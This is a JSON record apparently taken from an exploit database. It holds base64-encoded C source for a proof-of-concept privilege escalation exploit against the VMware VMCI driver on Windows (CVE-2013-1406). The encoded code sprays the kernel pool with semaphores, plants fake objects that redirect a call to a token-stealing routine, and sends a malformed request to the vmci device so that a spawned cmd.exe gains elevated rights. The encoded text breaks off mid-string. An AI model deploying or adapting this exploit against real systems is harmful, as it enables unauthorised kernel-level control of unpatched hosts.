{
    "source": "exploit-database", 
    "exploit": "LyoNCiAgICBDVkUtMjAxMy0xNDA2IGV4cGxvaXRhdGlvbiBQb0MNCiAgICBieSBBcnRlbSBTaGlzaGtpbiwNCiAgICBQb3NpdGl2ZSBSZXNlYXJjaCwNCiAgICBQb3NpdGl2ZSBUZWNobm9sb2dpZXMsDQogICAgMDItMjAxMw0KKi8NCg0Kdm9pZCBfX3N0ZGNhbGwgRmlyZVNoZWxsKERXT1JEIGR3U29tZVBhcmFtKQ0Kew0KICAgIEVzY2FsYXRlUHJpdmlsZWdlcyhoUHJvY2Vzc1RvRWxldmF0ZSk7DQogICAgLy8gRXF1YXRlIHRoZSBzdGFjayBhbmQgcXVpdCB0aGUgY3ljbGUNCiNpZm5kZWYgX0FNRDY0Xw0KICAgIF9fYXNtDQogICAgew0KICAgICAgICBwb3AgZWJ4DQogICAgICAgIHBvcCBlZGkNCiAgICAgICAgcHVzaCAweEZGRkZGRkY4DQogICAgICAgIHB1c2ggMHhBMDEwMDQzDQogICAgfQ0KI2VuZGlmDQp9DQoNCg0KSEFORExFIExvb2t1cE9iamVjdEhhbmRsZShQU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTl9FWCBwSGFuZGxlVGFibGUsIFBWT0lEIHBPYmplY3RBZGRyLCBEV09SRCBkd1Byb2Nlc3NJRCA9IDApDQp7DQogICAgSEFORExFICAgICAgICAgICAgaFJlc3VsdCA9IDA7DQogICAgRFdPUkQgICAgICAgICAgICBkd0xvb2t1cFByb2Nlc3NJRCA9IGR3UHJvY2Vzc0lEOw0KDQogICAgaWYgKHBIYW5kbGVUYWJsZSA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJBaW4ndCBmdW5ueVxuIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCg0KICAgIGlmIChkd0xvb2t1cFByb2Nlc3NJRCA9PSAwKQ0KICAgIHsNCiAgICAgICAgZHdMb29rdXBQcm9jZXNzSUQgPSBHZXRDdXJyZW50UHJvY2Vzc0lkKCk7DQogICAgfQ0KDQogICAgZm9yICh1bnNpZ25lZCBpbnQgaSA9IDA7IGkgPCBwSGFuZGxlVGFibGUtPk51bWJlck9mSGFuZGxlczsgaSsrKQ0KICAgIHsNCiAgICAgICAgaWYgKChwSGFuZGxlVGFibGUtPkhhbmRsZXNbaV0uVW5pcXVlUHJvY2Vzc0lkID09IChIQU5ETEUpZHdMb29rdXBQcm9jZXNzSUQpICYmIChwSGFuZGxlVGFibGUtPkhhbmRsZXNbaV0uT2JqZWN0ID09IHBPYmplY3RBZGRyKSkNCiAgICAgICAgew0KICAgICAgICAgICAgaFJlc3VsdCA9IHBIYW5kbGVUYWJsZS0+SGFuZGxlc1tpXS5IYW5kbGVWYWx1ZTsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIGhSZXN1bHQ7DQp9DQoNClBWT0lEIExvb2t1cE9iamVjdEFkZHJlc3MoUFNZU1RFTV9IQU5ETEVfSU5GT1JNQVRJT05fRVggcEhhbmRsZVRhYmxlLCBIQU5ETEUgaE9iamVjdCwgRFdPUkQgZHdQcm9jZXNzSUQgPSAwKQ0Kew0KICAgIFBWT0lEICAgIHBSZXN1bHQgPSAwOw0KICAgIERXT1JEICAgIGR3TG9va3VwUHJvY2Vzc0lEID0gZHdQcm9jZXNzSUQ7DQoNCiAgICBpZiAocEhhbmRsZVRhYmxlID09IE5VTEwpDQogICAgew0KICAgICAgICBwcmludGYoIkFpbid0IGZ1bm55XG4iKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KDQogICAgaWYgKGR3TG9va3VwUHJvY2Vzc0lEID09IDApDQogICAgew0KICAgICAgICBkd0xvb2t1cFByb2Nlc3NJRCA9IEdldEN1cnJlbnRQcm9jZXNzSWQoKTsNCiAgICB9DQoNCiAgICBmb3IgKHVuc2lnbmVkIGludCBpID0gMDsgaSA8IHBIYW5kbGVUYWJsZS0+TnVtYmVyT2ZIYW5kbGVzOyBpKyspDQogICAgew0KICAgICAgICBpZiAoKHBIYW5kbGVUYWJsZS0+SGFuZGxlc1tpXS5VbmlxdWVQcm9jZXNzSWQgPT0gKEhBTkRMRSlkd0xvb2t1cFByb2Nlc3NJRCkgJiYgKHBIYW5kbGVUYWJsZS0+SGFuZGxlc1tpXS5IYW5kbGVWYWx1ZSA9PSBoT2JqZWN0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgcFJlc3VsdCA9IChIQU5ETEUpcEhhbmRsZVRhYmxlLT5IYW5kbGVzW2ldLk9iamVjdDsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIHBSZXN1bHQ7DQp9DQoNCnZvaWQgQ2xvc2VUYWJsZUhhbmRsZShQU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTl9FWCBwSGFuZGxlVGFibGUsIEhBTkRMRSBoT2JqZWN0LCBEV09SRCBkd1Byb2Nlc3NJRCA9IDApDQp7DQogICAgRFdPUkQgICAgZHdMb29rdXBQcm9jZXNzSUQgPSBkd1Byb2Nlc3NJRDsNCg0KICAgIGlmIChwSGFuZGxlVGFibGUgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiQWluJ3QgZnVubnlcbiIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgaWYgKGR3TG9va3VwUHJvY2Vzc0lEID09IDApDQogICAgew0KICAgICAgICBkd0xvb2t1cFByb2Nlc3NJRCA9IEdldEN1cnJlbnRQcm9jZXNzSWQoKTsNCiAgICB9DQoNCiAgICBmb3IgKHVuc2lnbmVkIGludCBpID0gMDsgaSA8IHBIYW5kbGVUYWJsZS0+TnVtYmVyT2ZIYW5kbGVzOyBpKyspDQogICAgew0KICAgICAgICBpZiAoKHBIYW5kbGVUYWJsZS0+SGFuZGxlc1tpXS5VbmlxdWVQcm9jZXNzSWQgPT0gKEhBTkRMRSlkd0xvb2t1cFByb2Nlc3NJRCkgJiYgKHBIYW5kbGVUYWJsZS0+SGFuZGxlc1tpXS5IYW5kbGVWYWx1ZSA9PSBoT2JqZWN0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgcEhhbmRsZVRhYmxlLT5IYW5kbGVzW2ldLk9iamVjdCA9IE5VTEw7DQogICAgICAgICAgICBwSGFuZGxlVGFibGUtPkhhbmRsZXNbaV0uSGFuZGxlVmFsdWUgPSBOVUxMOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm47DQp9DQoNCnZvaWQgUG9vbFNwcmF5KCkNCnsNCiAgICAvLyBJbml0IHVzZWQgbmF0aXZlIEFQSSBmdW5jdGlvbg0KICAgIGxwTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiA9IChscE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbilHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoTCJudGRsbC5kbGwiKSwgIk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIpOw0KICAgIGlmIChOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiU3VjaCBhIGZhaWwuLi5cbiIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIC8vIERldGVybWluZSBvYmplY3Qgc2l6ZQ0KICAgIC8vIHhwOiANCiAgICAvL2NvbnN0IERXT1JEX1BUUiBkd1NlbWFwaG9yZVNpemUgPSAweDM4Ow0KICAgIC8vIDc6DQogICAgLy9jb25zdCBEV09SRF9QVFIgZHdTZW1hcGhvcmVTaXplID0gMHg0ODsNCg0KICAgIERXT1JEX1BUUiBkd1NlbWFwaG9yZVNpemUgPSAwOw0KDQogICAgaWYgKExPQllURShHZXRWZXJzaW9uKCkpID09IDUpDQogICAgew0KICAgICAgICBkd1NlbWFwaG9yZVNpemUgPSAweDM4Ow0KICAgIH0NCiAgICBlbHNlIGlmIChMT0JZVEUoR2V0VmVyc2lvbigpKSA9PSA2KQ0KICAgIHsNCiAgICAgICAgZHdTZW1hcGhvcmVTaXplID0gMHg0ODsNCiAgICB9DQoNCiAgICB1bnNpZ25lZCBpbnQgY3ljbGVDb3VudCA9IDA7DQogICAgd2hpbGUgKGN5Y2xlQ291bnQgPCA1MDAwMCkNCiAgICB7DQogICAgICAgIEhBTkRMRSBoVGVtcCA9IENyZWF0ZVNlbWFwaG9yZShOVUxMLCAwLCAzLCBOVUxMKTsNCiAgICAgICAgaWYgKGhUZW1wID09IE5VTEwpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQoNCiAgICAgICAgKytjeWNsZUNvdW50Ow0KICAgIH0NCg0KICAgIHByaW50ZigiXHRbK10gU3Bhd25lZCBsb3RzIG9mIHNlbWFwaG9yZXNcbiIpOw0KDQogICAgcHJpbnRmKCJcdFsuXSBJbml0aW5nIHBvb2wgd2luZG93c1xuIik7DQogICAgU2xlZXAoMjAwMCk7DQoNCiAgICBEV09SRCBkd05lZWRlZCA9IDQwOTY7DQogICAgTlRTVEFUVVMgc3RhdHVzID0gMHhGRkZGRkZGRjsNCiAgICBQVk9JRCBwQnVmID0gVmlydHVhbEFsbG9jKE5VTEwsIDQwOTYsIE1FTV9DT01NSVQsIFBBR0VfUkVBRFdSSVRFKTsNCg0KICAgIHdoaWxlICh0cnVlKQ0KICAgIHsNCiAgICAgICAgc3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbUV4dGVuZGVkSGFuZGxlSW5mb3JtYXRpb24sIHBCdWYsIGR3TmVlZGVkLCBOVUxMKTsNCiAgICAgICAgaWYgKHN0YXR1cyAhPSBTVEFUVVNfU1VDQ0VTUykNCiAgICAgICAgew0KICAgICAgICAgICAgZHdOZWVkZWQgKj0gMjsNCiAgICAgICAgICAgIFZpcnR1YWxGcmVlKHBCdWYsIDAsIE1FTV9SRUxFQVNFKTsNCiAgICAgICAgICAgIHBCdWYgPSBWaXJ0dWFsQWxsb2MoTlVMTCwgZHdOZWVkZWQsIE1FTV9DT01NSVQsIFBBR0VfUkVBRFdSSVRFKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfTsNCg0KICAgIEhBTkRMRSBoSGFuZGxlc1RvQ2xvc2VbMHgzMF0gPSB7MH07DQogICAgRFdPUkQgZHdDdXJQSUQgPSBHZXRDdXJyZW50UHJvY2Vzc0lkKCk7DQogICAgUFNZU1RFTV9IQU5ETEVfSU5GT1JNQVRJT05fRVggcEhhbmRsZVRhYmxlID0gKFBTWVNURU1fSEFORExFX0lORk9STUFUSU9OX0VYKXBCdWY7DQoNCiAgICBmb3IgKFVMT05HIGkgPSAwOyBpIDwgcEhhbmRsZVRhYmxlLT5OdW1iZXJPZkhhbmRsZXM7IGkrKykNCiAgICB7DQogICAgICAgIGlmIChwSGFuZGxlVGFibGUtPkhhbmRsZXNbaV0uVW5pcXVlUHJvY2Vzc0lkID09IChIQU5ETEUpZHdDdXJQSUQpDQogICAgICAgIHsNCiAgICAgICAgICAgIERXT1JEX1BUUiAgICBkd1Rlc3RPYmpBZGRyID0gKERXT1JEX1BUUilwSGFuZGxlVGFibGUtPkhhbmRsZXNbaV0uT2JqZWN0Ow0KICAgICAgICAgICAgRFdPUkRfUFRSICAgIGR3VGVzdEhhbmRsZVZhbCA9IChEV09SRF9QVFIpcEhhbmRsZVRhYmxlLT5IYW5kbGVzW2ldLkhhbmRsZVZhbHVlOw0KICAgICAgICAgICAgRFdPUkRfUFRSICAgIGR3V2luZG93QWRkcmVzcyA9IDA7DQogICAgICAgICAgICBib29sICAgICAgICBiUG9vbFdpbmRvd0ZvdW5kID0gZmFsc2U7DQoNCiAgICAgICAgICAgIFVJTlQgaU9iamVjdHNOZWVkZWQgPSAwOw0KICAgICAgICAgICAgLy8gTmVlZGVkIHdpbmRvdyBzaXplIGlzIHZtY2kgcGFja2V0IHBvb2wgY2h1bmsgc2l6ZSAoMHgyMTgpIGRpdmlkZWQgYnkNCiAgICAgICAgICAgIC8vIFNlbWFwaG9yZSBwb29sIGNodW5rIHNpemUgKGR3U2VtYXBob3JlU2l6ZSkNCiAgICAgICAgICAgIGlPYmplY3RzTmVlZGVkID0gKDB4MjE4IC8gZHdTZW1hcGhvcmVTaXplKSArICgoMHgyMTggJSBkd1NlbWFwaG9yZVNpemUgIT0gMCkgPyAxIDogMCk7DQogICAgICAgIA0KICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICAvLyBOb3Qgb24gYSBwYWdlIGJvdW5kYXJ5DQogICAgICAgICAgICAgICAgICAgICgoZHdUZXN0T2JqQWRkciAmIDB4RkZGKSAhPSAwKSANCiAgICAgICAgICAgICAgICAgICAgJiYgDQogICAgICAgICAgICAgICAgICAgIC8vIERvZXNuJ3QgY3Jvc3MgcGFnZSBib3VuZGFyeQ0KICAgICAgICAgICAgICAgICAgICAoKChkd1Rlc3RPYmpBZGRyICsgMHgzMDApICYgMHhGMDAwKSA9PSAoZHdUZXN0T2JqQWRkciAmIDB4RjAwMCkpIA0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBDaGVjayBwcmV2aW91cyBvYmplY3QgZm9yIGJlaW5nIG91ciBzZW1hcGhvcmUNCiAgICAgICAgICAgICAgICBEV09SRF9QVFIgZHdQcmV2T2JqZWN0ID0gZHdUZXN0T2JqQWRkciAtIGR3U2VtYXBob3JlU2l6ZTsNCiAgICAgICAgICAgICAgICBpZiAoTG9va3VwT2JqZWN0SGFuZGxlKHBIYW5kbGVUYWJsZSwgKFBWT0lEKWR3UHJldk9iamVjdCkgPT0gTlVMTCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGZvciAodW5zaWduZWQgaW50IGogPSAxOyBqIDwgaU9iamVjdHNOZWVkZWQ7IGorKykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIERXT1JEX1BUUiBkd05leHRUZXN0QWRkciA9IGR3VGVzdE9iakFkZHIgKyAoaiAqIGR3U2VtYXBob3JlU2l6ZSk7DQogICAgICAgICAgICAgICAgICAgIEhBTkRMRSBoTG9va2VkVXAgPSBMb29rdXBPYmplY3RIYW5kbGUocEhhbmRsZVRhYmxlLCAoUFZPSUQpZHdOZXh0VGVzdEFkZHIpOw0KDQogICAgICAgICAgICAgICAgICAgIC8vcHJpbnRmKCJkd1Rlc3RPYmpQdHIgPSAlMDhYLCBkd1Rlc3RPYmpIYW5kbGUgPSAlMDhYXG4iLCBkd1Rlc3RPYmpBZGRyLCBkd1Rlc3RIYW5kbGVWYWwpOw0KICAgICAgICAgICAgICAgICAgICAvL3ByaW50ZigiXHRkd1Rlc3ROZWlnaGJvdXIgPSAlMDhYXG4iLCBkd05leHRUZXN0QWRkcik7DQogICAgICAgICAgICAgICAgICAgIC8vcHJpbnRmKCJcdExvb2tlZCB1cCBoYW5kbGUgPSAlMDhYXG4iLCBoTG9va2VkVXApOw0KDQogICAgICAgICAgICAgICAgICAgIGlmIChoTG9va2VkVXAgIT0gTlVMTCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaEhhbmRsZXNUb0Nsb3NlW2pdID0gaExvb2tlZFVwOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaiA9PSBpT2JqZWN0c05lZWRlZCAtIDEpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gTm93IHRlc3QgdGhlIGZvbGxvd2luZyBvYmplY3QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkd05leHRUZXN0QWRkciA9IGR3VGVzdE9iakFkZHIgKyAoKGogKyAxKSAqIGR3U2VtYXBob3JlU2l6ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKExvb2t1cE9iamVjdEhhbmRsZShwSGFuZGxlVGFibGUsIChQVk9JRClkd05leHRUZXN0QWRkcikgIT0gTlVMTCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhIYW5kbGVzVG9DbG9zZVswXSA9IChIQU5ETEUpZHdUZXN0SGFuZGxlVmFsOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiUG9vbFdpbmRvd0ZvdW5kID0gdHJ1ZTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkd1dpbmRvd0FkZHJlc3MgPSBkd1Rlc3RPYmpBZGRyOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIENsb3NlIGhhbmRsZXMgdG8gY3JlYXRlIGEgbWVtb3J5IHdpbmRvdw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGludCBrID0gMDsgayA8IGlPYmplY3RzTmVlZGVkOyBrKyspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoSGFuZGxlc1RvQ2xvc2Vba10gIT0gTlVMTCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDbG9zZUhhbmRsZShoSGFuZGxlc1RvQ2xvc2Vba10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENsb3NlVGFibGVIYW5kbGUocEhhbmRsZVRhYmxlLCBoSGFuZGxlc1RvQ2xvc2Vba10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChoSGFuZGxlc1RvQ2xvc2UsIDAsIHNpemVvZihoSGFuZGxlc1RvQ2xvc2UpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGhIYW5kbGVzVG9DbG9zZSwgMCwgc2l6ZW9mKGhIYW5kbGVzVG9DbG9zZSkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZiAoYlBvb2xXaW5kb3dGb3VuZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHByaW50ZigiXHRbK10gV2luZG93IGZvdW5kIGF0ICUwOFghXG4iLCBkd1dpbmRvd0FkZHJlc3MpOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgVmlydHVhbEZyZWUocEJ1ZiwgMCwgTUVNX1JFTEVBU0UpOw0KDQogICAgcmV0dXJuOw0KfQ0KDQp2b2lkIEluaXRGYWtlQnVmKFBWT0lEIHBCdWYsIERXT1JEIGR3U2l6ZSkNCnsNCiAgICBpZiAocEJ1ZiAhPSBOVUxMKQ0KICAgIHsNCiAgICAgICAgUnRsRmlsbE1lbW9yeShwQnVmLCBkd1NpemUsIDB4MTEpOw0KICAgIH0NCg0KICAgIHJldHVybjsNCn0NCg0Kdm9pZCBQbGFjZUZha2VPYmplY3RzKFBWT0lEIHBCdWYsIERXT1JEIGR3U2l6ZSwgRFdPUkQgZHdTdGVwKQ0Kew0KICAgIC8qDQogICAgICAgIFByZXZpb3VzIGNodW5rIHNpemUgd2lsbCBiZSBhbHdheXMgMHg0MyBhbmQgdGhlIHBvb2wgaW5kZXggd2lsbCBiZSAwLCBzbyB0aGUgbGFzdCBieXRlcyB3aWxsIGJlIDB4MDA0Mw0KICAgICAgICBTbywgZm9yIGV2ZXJ5IDB4WFhYWDAwNDMgYWRkcmVzcyB3ZSBtdXN0IHN1ZmZpY2UgdGhlIGZvbGxvd2luZyBjb25kaXRpb25zOg0KDQogICAgICAgIGxlYSAgICAgICAgZWR4LCBbZWF4KzM4aF0NCiAgICAgICAgbG9jayAgICB4YWRkIFtlZHhdLCBlY3gNCiAgICAgICAgY21wICAgICAgICBlY3gsIDENCg0KICAgICAgICBTb21lIHNvcnQgb2YgbG9jayBhdCBbYWRkciArIDM4XSBtdXN0IGJlIGVxdWFsIHRvIDEuIEFuZA0KDQogICAgICAgIGNhbGwgICAgZHdvcmQgcHRyIFtlYXgrMEFDaF0NCg0KICAgICAgICBUaGUgY2FsbCBzaXRlIGlzIGxvY2F0ZWQgYXQgW2FkZHIgKyAweEFDXQ0KDQogICAgICAgIEFsc28gZmFrZSB0aGUgb2JqZWN0IHRvIGJlIGRlcmVmZXJlbmNlZCBhdCBbYWRkciArIDB4MTAwXQ0KICAgICovDQoNCiAgICBpZiAocEJ1ZiAhPSBOVUxMKQ0KICAgIHsNCiAgICAgICAgZm9yIChQVUNIQVIgaUFkZHIgPSAoUFVDSEFSKXBCdWYgKyAweDQzOyBpQWRkciA8IChQVUNIQVIpcEJ1ZiArIGR3U2l6ZTsgaUFkZHIgPSBpQWRkciArIGR3U3RlcCkNCiAgICAgICAgew0KICAgICAgICAgICAgUERXT1JEIHBMb2NrID0gKFBEV09SRCkoaUFkZHIgKyAweDM4KTsNCiAgICAgICAgICAgIFBEV09SRF9QVFIgcENhbGxNZU1heUJlID0gKFBEV09SRF9QVFIpKGlBZGRyICsgMHhBQyk7DQogICAgICAgICAgICBQRFdPUkRfUFRSIHBGYWtlRGVyZWZPYmogPSAoUERXT1JEX1BUUikoaUFkZHIgKyAweDEwMCk7DQoNCiAgICAgICAgICAgICpwTG9jayA9IDE7DQogICAgICAgICAgICAqcENhbGxNZU1heUJlID0gKERXT1JEX1BUUilGaXJlU2hlbGw7DQogICAgICAgICAgICAqcEZha2VEZXJlZk9iaiA9IChEV09SRF9QVFIpcEJ1ZiArIDB4MTAwMDsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybjsNCn0NCg0Kdm9pZCBQZW5ldHJhdGVWTUNJKCkNCnsNCiAgICAvKg0KDQogICAgICAgIFZNd2FyZSBTZWN1cml0eSBBZHZpc29yeQ0KICAgICAgICBBZHZpc29yeSBJRDogICAgVk1TQS0yMDEzLTAwMDINCiAgICAgICAgU3lub3BzaXM6ICAgIFZNd2FyZSBFU1gsIFdvcmtzdGF0aW9uLCBGdXNpb24sIGFuZCBWaWV3IFZNQ0kgcHJpdmlsZWdlIGVzY2FsYXRpb24gdnVsbmVyYWJpbGl0eQ0KICAgICAgICBJc3N1ZSBkYXRlOiAgICAyMDEzLTAyLTA3DQogICAgICAgIFVwZGF0ZWQgb246ICAgIDIwMTMtMDItMDcgKGluaXRpYWwgYWR2aXNvcnkpDQogICAgICAgIENWRSBudW1iZXJzOiAgICBDVkUtMjAxMy0xNDA2DQoNCiAgICAqLw0KDQogICAgRFdPUkQgZHdQaWRUb0VsZXZhdGUgPSAwOw0KICAgIEhBTkRMRSBoU3VzcFRocmVhZCA9IE5VTEw7DQoNCiAgICBib29sIGJYUCA9IChMT0JZVEUoR2V0VmVyc2lvbigpKSA9PSA1KTsNCiAgICBib29sIGI3ID0gKChMT0JZVEUoR2V0VmVyc2lvbigpKSA9PSA2KSAmJiAoSElCWVRFKExPV09SRChHZXRWZXJzaW9uKCkpKSA9PSAxKSk7DQogICAgYm9vbCBiOCA9ICgoTE9CWVRFKEdldFZlcnNpb24oKSkgPT0gNikgJiYgKEhJQllURShMT1dPUkQoR2V0VmVyc2lvbigpKSkgPT0gMikpOw0KDQogICAgaWYgKCFJbml0S2VybmVsRnVuY3MoKSkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIExpa2UgSSBkb24ndCBrbm93IHdoZXJlIHRoZSBzaGVsbGNvZGUgZnVuY3Rpb25zIGFyZVxuIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBpZiAoYlhQKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbP10gV2hvIGRvIHdlIHdhbnQgdG8gZWxldmF0ZT9cbiIpOw0KICAgICAgICBzY2FuZl9zKCIlZCIsICZkd1BpZFRvRWxldmF0ZSk7DQoNCiAgICAgICAgaFByb2Nlc3NUb0VsZXZhdGUgPSBPcGVuUHJvY2VzcyhQUk9DRVNTX1FVRVJZX0lORk9STUFUSU9OLCBGQUxTRSwgZHdQaWRUb0VsZXZhdGUpOw0KICAgICAgICBpZiAoaFByb2Nlc3NUb0VsZXZhdGUgPT0gTlVMTCkNCiAgICAgICAgew0KICAgICAgICAgICAgcHJpbnRmKCJbLV0gVGhpcyBwcm9jZXNzIGRvZXNuJ3Qgd2FudCB0byBiZSBlbGV2YXRlZFxuIik7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoYjcgfHwgYjgpDQogICAgew0KICAgICAgICAvLyBXZSBhcmUgdW5hYmxlIHRvIGNoYW5nZSBhbiBhY3RpdmUgcHJvY2VzcyB0b2tlbiBvbi10aGUtZmx5LA0KICAgICAgICAvLyBzbyB3ZSBjcmVhdGUgYSBjdXN0b20gc2hlbGwgc3VzcGVuZGVkIChJb25lc2N1IGhhY2spDQogICAgICAgIFNUQVJUVVBJTkZPIHNpID0gezB9Ow0KICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpID0gezB9Ow0KDQogICAgICAgIHNpLndTaG93V2luZG93ID0gVFJVRTsNCg0KICAgICAgICBXQ0hBUiBjbWRQYXRoW01BWF9QQVRIXSA9IHswfTsNCiAgICAgICAgR2V0U3lzdGVtRGlyZWN0b3J5KGNtZFBhdGgsIE1BWF9QQVRIKTsNCiAgICAgICAgd2NzY2F0X3MoY21kUGF0aCwgTUFYX1BBVEgsIEwiXFxjbWQuZXhlIik7DQoNCiAgICAgICAgaWYgKENyZWF0ZVByb2Nlc3MoY21kUGF0aCwgTCIiLCBOVUxMLCBOVUxMLCBGQUxTRSwgQ1JFQVRFX1NVU1BFTkRFRCB8IENSRUFURV9ORVdfQ09OU09MRSwgTlVMTCwgTlVMTCwgJnNpLCAmcGkpID09IFRSVUUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGhQcm9jZXNzVG9FbGV2YXRlID0gcGkuaFByb2Nlc3M7DQogICAgICAgICAgICBoU3VzcFRocmVhZCA9IHBpLmhUaHJlYWQ7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBIQU5ETEUgaFZNQ0lEZXZpY2UgPSBDcmVhdGVGaWxlKEwiXFxcXC5cXHZtY2kiLCBHRU5FUklDX1JFQUQgfCBHRU5FUklDX1dSSVRFLCBGSUxFX1NIQVJFX1JFQUQgfCBGSUxFX1NIQVJFX1dSSVRFLCBOVUxMLCBPUEVOX0VYSVNUSU5HLCBOVUxMLCBOVUxMKTsNCiAgICBpZiAoaFZNQ0lEZXZpY2UgIT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpDQogICAgew0KICAgICAgICBVQ0hBUiBCYWRCdWZmWzB4NjI0XSA9IHswfTsNCiAgICAgICAgVUNIQVIgcmV0QnVmWzB4NjI0XSA9IHswfTsNCiAgICAgICAgRFdPUkQgZHdSZXQgPSAwOw0KDQogICAgICAgIHByaW50ZigiWytdIFZNQ0kgc2VydmljZSBmb3VuZCBydW5uaW5nXG4iKTsNCg0KICAgICAgICBQVk1fUkVRVUVTVCBwVm1SZXEgPSAoUFZNX1JFUVVFU1QpQmFkQnVmZjsNCiAgICAgICAgcFZtUmVxLT5IZWFkZXIuUmVxdWVzdFNpemUgPSAweEZGRkZGRkYwOw0KICAgICAgICANCiAgICAgICAgUFZPSUQgcFNoZWxsU3ByYXlCdWZTdGQgPSBOVUxMOw0KICAgICAgICBQVk9JRCBwU2hlbGxTcHJheUJ1ZlF0ZCA9IE5VTEw7DQogICAgICAgIFBWT0lEIHBTaGVsbFNwcmF5QnVmU3RkNyA9IE5VTEw7DQogICAgICAgIFBWT0lEIHBTaGVsbFNwcmF5QnVmUXRkNyA9IE5VTEw7DQogICAgICAgIFBWT0lEIHBTaGVsbFNwcmF5QnVmQ2hrOCA9IE5VTEw7DQoNCiAgICAgICAgaWYgKChiNykgfHwgKGJYUCkgfHwgKGI4KSkNCiAgICAgICAgew0KICAgICAgICAgICAgLyoNCiAgICAgICAgICAgICAgICBTaWduaWZpY2FudCBiaXRzIG9mIGEgUG9vbFR5cGUgb2YgYSBjaHVuayBkZWZpbmUgdGhlIGZvbGxvd2luZyByZWdpb25zOg0KICAgICAgICAgICAgICAgIDB4MEEwMDAwMDAgLSAweDBCRkZGRkZGIC0gU3RhbmRhcmQgY2h1bmsNCiAgICAgICA